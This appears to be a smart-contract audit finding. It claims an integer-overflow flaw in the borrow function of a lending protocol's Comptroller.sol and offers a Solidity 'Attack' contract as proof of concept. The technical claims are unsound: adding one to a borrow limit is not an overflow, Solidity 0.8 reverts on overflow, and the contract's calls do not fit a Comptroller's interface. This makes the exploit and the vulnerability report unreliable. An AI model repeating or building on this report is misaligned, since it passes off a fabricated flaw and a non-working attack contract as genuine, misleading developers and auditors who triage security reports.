# Vulnerability details

## Impact
The borrow function in Comptroller.sol does not perform sufficient input validation on the amount being borrowed. This means that an attacker could pass in an integer that is too large, which could cause the function to overflow and return an incorrect value.

An attacker could exploit this vulnerability to borrow more than the amount of underlying assets that they are actually entitled to. This could lead to financial losses for the protocol and its users.

## Proof of Concept
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@venusprotocol/protocol/contracts/Comptroller.sol";

contract Attack {

  Comptroller public comptroller;
  ERC20 public underlying;

  constructor(address _comptroller, address _underlying) {
    comptroller = Comptroller(_comptroller);
    underlying = ERC20(_underlying);
  }

  function exploit() public {
    // Calculate the maximum amount that can be borrowed
    uint256 maxBorrow = comptroller.borrowLimit(underlying);

    // Overflow the input
    uint256 overflow = maxBorrow + 1;

    // Borrow the overflowing amount
    comptroller.borrow(overflow, underlying);
  }
}


